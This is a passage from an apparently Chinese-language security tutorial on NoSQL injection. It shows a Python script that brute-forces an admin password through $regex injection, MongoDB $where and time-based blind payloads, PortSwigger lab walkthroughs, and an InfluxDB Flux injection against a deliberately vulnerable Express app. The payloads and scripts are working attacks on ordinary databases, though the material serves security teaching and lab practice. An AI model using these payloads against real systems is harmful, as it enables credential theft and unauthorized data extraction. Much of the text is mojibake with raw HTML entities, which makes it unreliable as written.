c in string.printable: if c not in [\u0026#39;*\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;$\u0026#39;]: # When the method is GET get_payload = \u0026#39;?username=admin\u0026amp;password[$regex]=^%s\u0026#39; % (password + c) # When the method is POST post_payload = { \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password[$regex]\u0026#34;: \u0026#39;^\u0026#39; + password + c } # When the method is POST with JSON json_payload = \u0026#34;\u0026#34;\u0026#34;{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;^%s\u0026#34;}}\u0026#34;\u0026#34;\u0026#34; % (password + c) #headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} #r = requests.post(url=url, headers=headers, data=json_payload) # ç®€å•å‘é€ json r = requests.post(url=url, data=post_payload) if \u0026#39;Login Success\u0026#39; in r.text: print(\u0026#34;[+] %s\u0026#34; % (password + c)) password += c # è¾“å‡ºå¦‚ä¸‹: # [+] 1 # [+] 12 # [+] 123 # [+] 1234 # [+] 12345 # [+] 123456 æ—¶é—´ç›²æ³¨ #\rä¸€äº›playload\n{\u0026#34;$where\u0026#34;: \u0026#34;sleep(5000)\u0026#34;} admin\u0026#39;+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]===\u0026#34;a\u0026#34;) \u0026amp;\u0026amp; waitTill \u0026gt; new Date()){};}(this)+\u0026#39; admin\u0026#39;+function(x){if(x.password[0]===\u0026#34;a\u0026#34;){sleep(5000)};}(this)+\u0026#39; portwigger-lab #\råˆ©ç”¨NoSQL æ³¨å…¥æå–æ•°æ® #\ré¦–å…ˆè¿›æ¥è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰ç»™çš„å·è¿›å…¥ å‘ç°æœ‰ä¸ªlookupçš„æ–‡ä»¶è¿›è¡Œæœç´¢userï¼š https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener æ‰€ä»¥è¿™é‡Œå°±å°è¯•åˆ¤æ–­æ³¨å…¥æ˜¯å¦å­˜åœ¨ playloadï¼š https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener' https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener' \u0026amp;\u0026amp; \u0026lsquo;1\u0026rsquo;==\u0026lsquo;1 æ­£å¸¸ï¼Œæ‰€ä»¥åˆ¤æ–­æ˜¯æœ‰æ³¨å…¥çš„ï¼Œé‚£ä¹ˆè¿™é‡Œå¦‚ä½•è·å–æ•°æ®å‘¢ï¼Ÿ å°½ç®¡é¢˜ç›®ç»™äº†adminçš„è´¦æˆ·åï¼Œä½†æ˜¯å¯¹äºå®æˆ˜å½“ä¸­æˆ‘ä»¬æ˜¯æ²¡åŠæ³•çŸ¥é“ç”¨æˆ·åçš„ï¼Œæ‰€ä»¥æˆ‘è¿˜æ˜¯ä»¥winterè¿™ä¸ªaccountåšä¾‹å­ playloadï¼š https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener' \u0026amp;\u0026amp; this.password.length \u0026lt; 30 || \u0026lsquo;a\u0026rsquo;=\u0026lsquo;b https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener' \u0026amp;\u0026amp; this.password.length \u0026lt; 0 || \u0026lsquo;a\u0026rsquo;=\u0026lsquo;b æ‰€ä»¥è¿™é‡Œçœ‹è§æ˜¯å¯ä»¥å¯¹é•¿åº¦è¿›è¡Œåˆ¤æ–­çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„å¯†ç æ˜¯peterä¹Ÿå°±æ˜¯5ä½é‚£æˆ‘ä»¬æ„é€ ä¸‹length ==5ä¹Ÿæ˜¯ä¸ºçœŸçš„ã€‚ æ¥ä¸‹æ¥å¯ä»¥åˆ©ç”¨\nwinter\u0026#39; \u0026amp;\u0026amp; this.password\\[0\\]=\\=\u0026#39;a è¿›è¡ŒçŒœå¯†ç ï¼Œè¿™é‡Œå¯ä»¥å†™è„šæœ¬ä¹Ÿå¯ä»¥burpå¯åŠ¨ è¿™é‡Œå°±æ”¾å‡ºä¸€äº›ä¾‹å­çš„å›¾ç‰‡ï¼Œä¸å¤šè¯´æ˜ è¯†åˆ«å­—æ®µåç§° #\rç”±äº MongoDB å¤„ç†ä¸éœ€è¦å›ºå®šæ¶æ„çš„åŠç»“æ„åŒ–æ•°æ®ï¼Œå› æ­¤æ‚¨å¯èƒ½éœ€è¦å…ˆè¯†åˆ«é›†åˆä¸­çš„æœ‰æ•ˆå­—æ®µï¼Œç„¶åæ‰èƒ½ä½¿ç”¨ JavaScript æ³¨å…¥æå–æ•°æ®ã€‚\nä¾‹å¦‚ï¼Œè¦è¯†åˆ«MongoDBæ•°æ®åº“æ˜¯å¦åŒ…å«å­—æ®µpasswordï¼Œæ‚¨å¯ä»¥æäº¤ä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½ï¼š\nhttps://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d' å†æ¬¡å‘é€ç°æœ‰å­—æ®µå’Œä¸å­˜åœ¨å­—æ®µçš„æœ‰æ•ˆè´Ÿè½½ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ‚¨çŸ¥é“è¯¥usernameå­—æ®µå­˜åœ¨ï¼Œå› æ­¤æ‚¨å¯ä»¥å‘é€ä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½ï¼š\nadmin\u0026#39; \u0026amp;\u0026amp; this.username!=\u0026#39; admin\u0026#39; \u0026amp;\u0026amp; this.foo!=\u0026#39; å¦‚æœè¯¥passwordå­—æ®µå­˜åœ¨ï¼Œæ‚¨ä¼šæœŸæœ›å“åº”ä¸ç°æœ‰å­—æ®µ ( ) çš„å“åº”ç›¸åŒusernameï¼Œä½†ä¸ä¸å­˜åœ¨å­—æ®µ (Â foo) çš„å“åº”ä¸åŒã€‚\nå¦‚æœæ‚¨æƒ³æµ‹è¯•ä¸åŒçš„å­—æ®µåç§°ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨å•è¯åˆ—è¡¨å¾ªç¯ä¸åŒçš„æ½œåœ¨å­—æ®µåç§°æ¥æ‰§è¡Œå­—å…¸æ”»å‡»ã€‚\nåˆ©ç”¨NoSQLè¿ç®—ç¬¦æ³¨å…¥æ¥æå–æ•°æ® #\rå‡è®¾æœ‰ä¸€ä¸ªæ¥å—çš„ç¨‹åºï¼š\n{\u0026#34;username\u0026#34;:\u0026#34;wiener\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;peter\u0026#34;} è¦æµ‹è¯•æ˜¯å¦å¯ä»¥æ³¨å…¥è¿ç®—ç¬¦ï¼Œæ‚¨å¯ä»¥å°è¯•å°†$whereè¿ç®—ç¬¦æ·»åŠ ä¸ºé™„åŠ å‚æ•°ï¼Œç„¶åå‘é€ä¸€ä¸ªæ¡ä»¶è®¡ç®—ç»“æœä¸º false çš„è¯·æ±‚ï¼Œä»¥åŠå¦ä¸€ä¸ªè®¡ç®—ç»“æœä¸º true çš„è¯·æ±‚ã€‚ä¾‹å¦‚ï¼š\n{\u0026#34;username\u0026#34;:\u0026#34;wiener\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;peter\u0026#34;, \u0026#34;$where\u0026#34;:\u0026#34;0\u0026#34;} {\u0026#34;username\u0026#34;:\u0026#34;wiener\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;peter\u0026#34;, \u0026#34;$where\u0026#34;:\u0026#34;1\u0026#34;} å¦‚æœå­˜åœ¨å·®å¼‚ï¼Œåˆ™å­˜åœ¨æ³¨å…¥ æå–å­—æ®µåç§° #\r\u0026#34;$where\u0026#34;:\u0026#34;Object.keys(this)[0].match(\u0026#39;^.{0}a.*\u0026#39;)\u0026#34; è¿™å°†æ£€æŸ¥ç”¨æˆ·å¯¹è±¡ä¸­çš„ç¬¬ä¸€ä¸ªæ•°æ®å­—æ®µå¹¶è¿”å›å­—æ®µåç§°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚è¿™ä½¿æ‚¨èƒ½å¤Ÿé€å­—ç¬¦æå–å­—æ®µåç§°\nlab #\ré¦–å…ˆè¯´ä¸€ä¸‹å¤§æ¦‚çš„æ€è·¯ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨å‰é¢çš„{$ne:\u0026rsquo;\u0026rsquo;}æ„é€ ä¸€ä¸ªä¸‡èƒ½å¯†ç ï¼Œä¼šå‘ç°ç™»å½•ä¸äº†ä¹Ÿå°±æ˜¯ï¼ˆAccount lockedï¼‰éœ€è¦reset passwordï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬ç›´æ¥åˆ©ç”¨è¯­å¥\u0026quot;$where\u0026quot;:\u0026quot;Object.keys(this)[1].match('^.{}.*')\u0026quot;æ¥è·å–jsonçš„åç§°ï¼Œç±»ä¼¼äº\n{ \u0026#34;username\u0026#34;:\u0026#34;xxxxx\u0026#34; \u0026#34;password\u0026#34;:\u0026#34;xxxxxx\u0026#34; \u0026#34;forgetPWD\u0026#34;:\u0026#34;xxxxx\u0026#34; } ä¸­çš„username,passwordï¼Œæˆ‘ä»¬ç»™å¯¹æ–¹çš„é‚®ç®±å‘é€é‡ç½®å¯†ç ï¼Œç„¶ååˆ©ç”¨ä¸Šé¢çš„è¯­å¥æŸ¥å‡ºæ¥æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿æ˜¯åœ¨ç¬¬å‡ ä¸ªkeyä¹‹ä¸­ï¼ˆå…¶å®å°±æ˜¯åˆ¤æ–­ä»–æ˜¯å¦å­˜åœ¨è¿™ä¸ªä¸œè¥¿ï¼‰ä¾‹å¦‚è¿™é‡Œçš„forgetpwdå°±æ˜¯key\n\\[3\\]æˆ‘ä»¬éœ€è¦é‡Œé¢çš„å€¼å°±å¯ä»¥å†ä½¿ç”¨è¯­å¥ï¼š\u0026quot;$where\u0026quot;:\u0026ldquo;this.forgetPWD.match(\u0026rsquo;^.{1}1.*\u0026rsquo;)\u0026ldquo;åœ¨æ•°å­—ä¸€å¡«å…¥å‚æ•°æ¥è¿›è¡Œçˆ†ç ´æœ€ç»ˆè·å–æ•°æ®ï¼Œå› ä¸ºæˆ‘è¿™é‡Œçš„labå“åº”å¤ªæ…¢äº†æˆ‘è¿™é‡Œç›´æ¥æ”¾ä¸€ä¸ªè§†é¢‘é“¾æ¥å¯ä»¥å»çœ‹çœ‹å…·ä½“æ“ä½œ : https://www.youtube.com/watch?v=fyOzoqd2hl4\njavascriptè¿ç®—ç¬¦æå–æ•°æ® #\ræˆ–è€…ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨æ— æ³•è¿è¡Œ JavaScript çš„è¿ç®—ç¬¦æ¥æå–æ•°æ®ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨Â $regexè¿ç®—ç¬¦é€å­—ç¬¦æå–æ•°æ®ã€‚\nè€ƒè™‘ä¸€ä¸ªæ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºï¼Œå®ƒæ¥å—è¯·æ±‚æ­£æ–‡ä¸­çš„ç”¨æˆ·åå’Œå¯†ç POSTã€‚ä¾‹å¦‚ï¼š\n{\u0026#34;username\u0026#34;:\u0026#34;myuser\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;mypass\u0026#34;} æ‚¨å¯ä»¥é¦–å…ˆæµ‹è¯•è¿ç®—ç¬¦æ˜¯å¦$regexè¢«å¤„ç†ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;^.*\u0026#34;}} å¦‚æœå¯¹æ­¤è¯·æ±‚çš„å“åº”ä¸æ‚¨æäº¤é”™è¯¯å¯†ç æ—¶æ”¶åˆ°çš„å“åº”ä¸åŒï¼Œåˆ™è¡¨æ˜è¯¥åº”ç”¨ç¨‹åºå¯èƒ½å­˜åœ¨æ¼æ´ã€‚æ‚¨å¯ä»¥ä½¿ç”¨$regexè¿ç®—ç¬¦é€å­—ç¬¦æå–æ•°æ®ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½æ£€æŸ¥å¯†ç æ˜¯å¦ä»¥ å¼€å¤´Â aï¼š\n{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;^a*\u0026#34;}} å½“ç„¶åŸç†æ˜¯ä¸€æ ·çš„ ä»¥ä¸Šçš„æ³¨å…¥éƒ½æ˜¯åŸºäºmangodbçš„è¯­æ³•ï¼Œæ¥ä¸‹æ¥æ˜¯ä¸€ç§ï¼ˆæƒæ–°ç‰ˆæœ¬ï¼‰\nInfluxDB #\råœ¨æ­£å¼æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè¦äº†è§£ä¸€äº›å…³äºinfluxdbå¿…è¦çš„çŸ¥è¯†ï¼ˆä¸»è¦æ˜¯è¿™ä¸ªæ•°æ®åº“ç¡®å®æ¯”è¾ƒå†·é—¨ï¼Œä½†æ˜¯ä¸æ’é™¤ctfä¼šè€ƒï¼‰\nä»€ä¹ˆæ˜¯InfluxDB #\rInfluxDB æ˜¯ä¸€ç§æµè¡Œçš„å¼€æºæ—¶é—´åºåˆ—æ•°æ®åº“ï¼Œæ—¨åœ¨å¤„ç†å¤§é‡å¸¦æ—¶é—´æˆ³çš„æ•°æ®ã€‚InfluxDB å¹¿æ³›ç”¨äºç›‘æ§å’Œåˆ†ææ¥è‡ªä¼ æ„Ÿå™¨ã€åº”ç”¨ç¨‹åºå’Œç‰©è”ç½‘è®¾å¤‡ç­‰å„ç§æ¥æºçš„æŒ‡æ ‡ã€äº‹ä»¶å’Œå®æ—¶æ•°æ®ã€‚\ninfluxDBçš„æ•°æ®ç»„ç»‡ #\rInfluxDB æ•°æ®æ¨¡å‹å°†æ—¶é—´åºåˆ—æ•°æ®ç»„ç»‡åˆ°å­˜å‚¨æ¡¶å’Œæµ‹é‡ä¸­ã€‚ä¸€ä¸ªæ¡¶å¯ä»¥åŒ…å«å¤šä¸ªæµ‹é‡å€¼ã€‚æµ‹é‡åŒ…å«å¤šä¸ªæ ‡ç­¾å’Œå­—æ®µã€‚\nBucketï¼šå­˜å‚¨æ—¶é—´åºåˆ—æ•°æ®çš„æŒ‡å®šä½ç½®ã€‚ä¸€ä¸ªæ¡¶å¯ä»¥åŒ…å«å¤šä¸ª_æµ‹é‡å€¼_ã€‚ æµ‹é‡ï¼šæ—¶é—´åºåˆ—æ•°æ®çš„é€»è¾‘åˆ†ç»„ã€‚ç»™å®šæµ‹é‡ä¸­çš„æ‰€æœ‰_ç‚¹éƒ½åº”å…·æœ‰ç›¸åŒçš„__æ ‡ç­¾_ã€‚ä¸€ä¸ªæµ‹é‡åŒ…å«å¤šä¸ª_æ ‡ç­¾_å’Œ_å­—æ®µ_ã€‚ Tagsï¼šé”®å€¼å¯¹ï¼Œå…¶å€¼ä¸åŒï¼Œä½†ä¸ç»å¸¸æ›´æ”¹ã€‚æ ‡ç­¾ç”¨äºå­˜å‚¨æ¯ä¸ªç‚¹çš„å…ƒæ•°æ® - ä¾‹å¦‚ï¼Œç”¨äºè¯†åˆ«æ•°æ®æºï¼ˆå¦‚ä¸»æœºã€ä½ç½®ã€ç«™ç‚¹ç­‰ï¼‰çš„ä¸œè¥¿ã€‚ å­—æ®µï¼šé”®å€¼å¯¹ï¼Œå…¶å€¼éšæ—¶é—´å˜åŒ–ï¼Œä¾‹å¦‚ï¼šæ¸©åº¦ã€å‹åŠ›ã€è‚¡ç¥¨ä»·æ ¼ç­‰ã€‚ Timestampï¼šä¸æ•°æ®å…³è”çš„æ—¶é—´æˆ³ã€‚å½“å­˜å‚¨åœ¨ç£ç›˜ä¸Šå¹¶æŸ¥è¯¢æ—¶ï¼Œæ‰€æœ‰æ•°æ®éƒ½æŒ‰æ—¶é—´æ’åºã€‚ å†™å…¥æ•°æ®çš„ä¸€äº›æ“ä½œ #\ré¦–å…ˆï¼Œæˆ‘ä»¬è¦çŸ¥é“â€”â€”å†™å…¥influxdbçš„æ•°æ®éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªå«åšÂ line protocolï¼ˆç¿»è¯‘å«åšçº¿è·¯åè®®ï¼Œæ„Ÿè§‰ç¿»è¯‘çš„ä¸æ˜¯å¾ˆå¥½ï¼Œæ‰€ä»¥å°±ç›´æ¥æ‹¿å‡ºæ¥ï¼Œä»¥ä¸‹ç®€ç§°:LPï¼‰ åœ¨å®˜æ–¹æ–‡æ¡£ä¸­ä¸¾äº†ä¸€ä¸ªä¾‹å­ï¼š\n// Syntax \u0026lt;measurement\u0026gt;[,\u0026lt;tag_key\u0026gt;=\u0026lt;tag_value\u0026gt;[,\u0026lt;tag_key\u0026gt;=\u0026lt;tag_value\u0026gt;]] \u0026lt;field_key\u0026gt;=\u0026lt;field_value\u0026gt;[,\u0026lt;field_key\u0026gt;=\u0026lt;field_value\u0026gt;] [\u0026lt;timestamp\u0026gt;] // Example myMeasurement,tag1=value1,tag2=value2 fieldKey=\u0026#34;fieldValue\u0026#34; 1556813561098000000 å®˜æ–¹æ–‡æ¡£è¿˜æç¤ºåˆ°ï¼š Line protocol does not support the newline characterÂ \\nÂ in tag or field values. ä¹Ÿå°±æ˜¯\\nä¸æ”¯æŒè½¬ä¹‰ä¸ºæ¢è¡Œç¬¦ï¼Œè€Œæ˜¯ä»£è¡¨ä¸€ä¸ªå•ç‹¬çš„point å…³äºè¿™ä¸ªåè®®çš„ä¸€äº›è¦ç´  measurement #\rå¿…é¡»å­˜åœ¨ï¼Œä¸”æ¯ä¸€ä¸ªæ•°æ®ç‚¹ä»…æ¥å—ä¸€ä¸ªmeasurementï¼Œå¹¶ä¸”éµå¾ªå‘½åè§„åˆ™ï¼š Measurement names, tag keys, and field keys cannot begin with an underscoreÂ _. TheÂ _Â namespace is reserved for InfluxDB system use. å®ƒçš„æ•°æ®ç±»å‹ä¸ºï¼šstring\nTag set #\rã€ä¸ä¸ºå¿…é¡»ï¼Œå¯é€‰ã€‘è¯¥ç‚¹çš„æ‰€æœ‰æ ‡ç­¾é”®å€¼å¯¹ã€‚é”®å€¼å…³ç³»ç”¨=æ“ä½œæ•°è¡¨ç¤ºã€‚å¤šä¸ªæ ‡ç­¾é”®å€¼å¯¹ä»¥é€—å·åˆ†éš”ã€‚Â _æ ‡ç­¾é”®å’Œæ ‡ç­¾å€¼åŒºåˆ†å¤§å°å†™ã€‚æ ‡ç­¾é”®å—åˆ°å‘½åé™åˆ¶ã€‚æ ‡ç­¾å€¼ä¸èƒ½ä¸ºç©ºï¼›ç›¸åï¼Œä»æ ‡ç­¾é›†ä¸­çœç•¥è¯¥æ ‡ç­¾ã€‚ æ•°æ®ç±»å‹ï¼šstring\nField set #\rå¿…é¡»å­˜åœ¨ï¼Œå’Œmeasurementä¸€æ ·ï¼Œå¿…é¡»å­˜åœ¨è‡³å°‘ä¸€ä¸ªfieldï¼Œå­—æ®µé”®å’Œå­—ç¬¦ä¸²å€¼åŒºåˆ†å¤§å°å†™ï¼ŒåŒæ ·å—åˆ°å‘½åé™åˆ¶ã€‚ æ•°æ®ç±»å‹ï¼šå¯¹äºé”®åï¼šstring å¯¹äºå€¼ï¼šFLOAT INTEGER ULINTEGER STRING BOOLEAN\nexample(åŒå¼•å·è¡¨ç¤ºfiledçš„å€¼):\nmeasurementName fieldKey=\u0026#34;field string value\u0026#34; 1556813561098000000 Timestamp #\rã€å¯é€‰æ‹©çš„ã€‘ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„æ—¶é—´æˆ³ã€‚InfluxDB æ¥å—æ¯ä¸ªç‚¹ä¸€ä¸ªæ—¶é—´æˆ³ã€‚å¦‚æœæœªæä¾›æ—¶é—´æˆ³ï¼ŒInfluxDB å°†ä½¿ç”¨å…¶ä¸»æœºçš„ç³»ç»Ÿæ—¶é—´ (UTC)ã€‚ æ•°æ®ç±»å‹ï¼šUnix Timestamp\nå…³äºæ—¶é—´æˆ³çš„é‡è¦è¯´æ˜(from docs) #\rä¸ºäº†ç¡®ä¿æ•°æ®ç‚¹åŒ…å«è§‚å¯ŸæŒ‡æ ‡çš„æ—¶é—´ï¼ˆæœªç”± InfluxDB æ¥æ”¶ï¼‰ï¼Œè¯·åŒ…å«æ—¶é—´æˆ³ã€‚ å¦‚æœæ‚¨çš„æ—¶é—´æˆ³ä¸æ˜¯çº³ç§’ï¼Œè¯·åœ¨å°†æ•°æ®å†™å…¥ InfluxDBæ—¶æŒ‡å®šæ—¶é—´æˆ³çš„ç²¾åº¦ã€‚ å…¶ä»–çš„ä¸€äº›ä¸œè¥¿ #\rQuotes(å•å¼•å·) #\rElement Double quotes Single quotes Measurement LimitedÂ * LimitedÂ * Tag key LimitedÂ * LimitedÂ * Tag value LimitedÂ * LimitedÂ * Field key LimitedÂ * LimitedÂ * Field value Strings only Never Timestamp Never Never Special Characters(ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦\\) #\råœ¨ä»¥ä¸‹æƒ…å†µä¸‹ï¼Œéœ€è¦ä½¿ç”¨åæ–œæ  (Â \\) è½¬ä¹‰æŸäº›å­—ç¬¦\nElement Escape characters Measurement Comma, Space Tag key Comma, Equals Sign, Space Tag value Comma, Equals Sign, Space Field key Comma, Equals Sign, Space Field value Double quote, Backslash model of LP #\rå…³äºè¿™ä¸ªLPï¼Œå®˜æ–¹ä¹Ÿç»™å‡ºäº†ä¸€ä¸ªæ¨¡å‹ï¼Œå¯ä»¥ç”¨æ¥æ„å»ºä¸€ä¸ªLP\nmeasurement:Â home tags room: Living Room or Kitchen fields temp: temperature in Â°C (float) hum: percent humidity (float) co: carbon monoxide in parts per million (integer) timestamp: Unix timestamp inÂ secondÂ precision æŸ¥è¯¢çš„æ“ä½œ #\rä¸¤ç§æŸ¥è¯¢è¯­è¨€ï¼š\nFluxï¼šä¸€ç§å‡½æ•°å¼è„šæœ¬è¯­è¨€ï¼Œæ—¨åœ¨æŸ¥è¯¢å’Œå¤„ç†æ¥è‡ª InfluxDB å’Œå…¶ä»–æ•°æ®æºçš„æ•°æ®ã€‚ InfluxQLï¼šä¸€ç§ç±»ä¼¼ SQL çš„æŸ¥è¯¢è¯­è¨€ï¼Œæ—¨åœ¨ä» InfluxDB æŸ¥è¯¢æ—¶é—´åºåˆ—æ•°æ®ã€‚ Fluxè¯­æ³• #\råŸºæœ¬æ ¼å¼ #\rfrom(bucket: \u0026#34;example-bucket\u0026#34;) |\u0026gt; range(start: -1d) |\u0026gt; filter(fn: (r) =\u0026gt; r._measurement == \u0026#34;example-measurement\u0026#34;) |\u0026gt; mean() |\u0026gt; yield(name: \u0026#34;_results\u0026#34;) from(): ä»å“ªä¸ªbucketä¸­æŸ¥è¯¢ range(): æ ¹æ®æ—¶é—´èŒƒå›´è¿‡æ»¤æ•°æ®ã€‚Flux éœ€è¦â€œæœ‰ç•Œâ€æŸ¥è¯¢â€”â€”ä»…é™äºç‰¹å®šæ—¶é—´èŒƒå›´çš„æŸ¥è¯¢ã€‚ filter(): æ ¹æ®åˆ—å€¼è¿‡æ»¤æ•°æ®ã€‚æ¯è¡Œç”± è¡¨ç¤ºrÂ ï¼Œæ¯åˆ—ç”± çš„å±æ€§è¡¨ç¤ºrã€‚å¯ä»¥ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨. yield():è¾“å‡ºã€‚ mean():è®¡ç®—æ¯ä¸ªè¾“å…¥è¡¨çš„åˆ—ä¸­éç©ºå€¼çš„å¹³å‡å€¼_value Pipe-forward operator(ç®¡é“è½¬å‘ç¬¦) #\rFlux ä½¿ç”¨ç®¡é“è½¬å‘è¿ç®—ç¬¦ (Â |\u0026gt;) å°†ä¸€ä¸ªå‡½æ•°çš„è¾“å‡ºä½œä¸ºè¾“å…¥ä¼ é€’åˆ°ä¸‹ä¸€ä¸ªå‡½æ•°ä½œä¸ºè¾“å…¥ã€‚ docsä¹Ÿæ˜¯ä¸¾äº†ä¸€ä¸ªä¾‹å­1: ä»¥ä¸‹ Flux æŸ¥è¯¢è¿”å›å­˜å‚¨åœ¨å®¶åº­æµ‹é‡ä¸­çš„ coã€humå’Œtempå­—æ®µï¼Œå…¶æ—¶é—´æˆ³åœ¨ 2022-01-01T08:00:00Z å’Œ 2022-01-01T20:00:01Z ä¹‹é—´ã€‚\nfrom(bucket: \u0026#34;get-started\u0026#34;) |\u0026gt; range(start: 2022-01-01T08:00:00Z, stop: 2022-01-01T20:00:01Z) |\u0026gt; filter(fn: (r) =\u0026gt; r._measurement == \u0026#34;home\u0026#34;) |\u0026gt; filter(fn: (r) =\u0026gt; r._field== \u0026#34;co\u0026#34; or r._field == \u0026#34;hum\u0026#34; or r._field == \u0026#34;temp\u0026#34;) influxQLè¯­æ³• #\rInfluxQL æ˜¯ä¸€ç§ç±» SQL æŸ¥è¯¢è¯­è¨€ï¼Œä¸å¤§å¤šæ•° SQL è¯­è¨€ç±»ä¼¼ï¼Œä½†ä¸“é—¨è®¾è®¡ç”¨äºæŸ¥è¯¢ InfluxDB 0.x å’Œ 1.x ä¸­çš„æ—¶é—´åºåˆ—æ•°æ®ã€‚\nåŸºæœ¬çš„æŸ¥è¯¢çŸ¥è¯† #\rSELECT: æŒ‡å®šè¦æŸ¥è¯¢çš„å­—æ®µå’Œæ ‡ç­¾ã€‚ FROM: æŒ‡å®šè¦æŸ¥è¯¢çš„æµ‹é‡å€¼ã€‚ä½¿ç”¨æµ‹é‡åç§°æˆ–åŒ…å«æ•°æ®åº“å’Œä¿ç•™ç­–ç•¥çš„å®Œå…¨é™å®šæµ‹é‡åç§°ã€‚ä¾‹å¦‚ï¼šdb.rp.measurementã€‚ WHERE:Â (å¯é€‰ï¼‰æ ¹æ®å­—æ®µã€æ ‡ç­¾å’Œæ—¶é—´è¿‡æ»¤æ•°æ®ã€‚ SELECT co,hum,temp,room FROM \u0026#34;get-started\u0026#34;.autogen.home WHERE time \u0026gt;= \u0026#39;2022-01-01T08:00:00Z\u0026#39; AND time \u0026lt;= \u0026#39;2022-01-01T20:00:00Z\u0026#39; å…¶å®å°±å’Œsqlè¯­å¥å·®ä¸å¤š.\næ³¨å…¥åˆ©ç”¨ #\rç»è¿‡ä¸Šé¢åŸºç¡€çŸ¥è¯†çš„å­¦ä¹ ï¼Œæƒ³å¿…ä½ å·²ç»æœ‰äº†ä¸€å®šçš„æ¦‚å¿µï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¼€å§‹åˆ©ç”¨å§\næ„å»ºä¸€ä¸ªæ˜“è¢«æ”»å‡»çš„web #\rconst express = require(\u0026#39;express\u0026#39;); const {InfluxDB, Point} = require(\u0026#39;@influxdata/influxdb-client\u0026#39;) const app = express(); const token = \u0026#39;REDACTED\u0026#39; // InfluxDB Token const url = \u0026#39;https://127.0.0.1\u0026#39; // Local Database endpoint const org = \u0026#39;myOrg\u0026#39; const bucket = \u0026#39;publicBucket\u0026#39; const client = new InfluxDB({url, token}) async function query(fluxQuery) { results = [] queryApi = client.getQueryApi(org) for await (const {values, tableMeta} of queryApi.iterateRows(fluxQuery)) { o = tableMeta.toObject(values) console.log(o) results.push(o) } return results } app.get(\u0026#39;/query\u0026#39;, async (req, res) =\u0026gt; { try { const fluxQuery = \u0026#39;from(bucket:\u0026#34;\u0026#39; + bucket + \u0026#39;\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; r._field == \u0026#34;public_field\u0026#34; and r._value == \u0026#34;\u0026#39; + req.query.data + \u0026#39;\u0026#34;) \u0026#39; result = await query(fluxQuery) res.send(result) } catch (err) { res.send(err.toString()) } }); const port = 3000; app.listen(port, () =\u0026gt; { console.log(`Server started on port ${port}`); }); å½“æˆ‘ä»¬åªä¼ å…¥\u0026quot;çš„æ—¶å€™ å‘ç°äº†æŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯ï¼š\nconst fluxQuery = \u0026#39; from(bucket:\u0026#34;\u0026#39; + bucket + \u0026#39;\u0026#34;) |\u0026gt; range(start: 0) |\u0026gt; filter(fn: (r) =\u0026gt; r._field == \u0026#34;public_field\u0026#34; and r._value == \u0026#34;\u0026#39; + req.query.data + \u0026#39;\u0026#34;) \u0026#39; result = await query(fluxQuery) è¿™æ ·çš„æŸ¥è¯¢è¯­å¥ï¼Œå…¶æŠ¥é”™å†…å®¹åœ¨ https://docs.influxdata.com/influxdb/v2.7/ å¯ä»¥æŸ¥æ‰¾åˆ°ï¼Œæ‰€ä»¥å¯ä»¥çŸ¥é“æ˜¯influxdbçš„æ•°æ®åº“\næ„å»ºä¸€äº›playload #\ræ³„éœ²bucketçš„åç§° #\rplayloadï¼š\n\u0026#34;) |\u0026gt; yield(name: \u0026#34;1337\u0026#34;) buckets() |\u0026gt; filter(fn: (r) =\u0026gt; r.name =~ /^a.*/ and die(msg:r.name)) // è¯¥buckets()å‡½æ•°åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰å­˜å‚¨æ¡¶ã€‚ 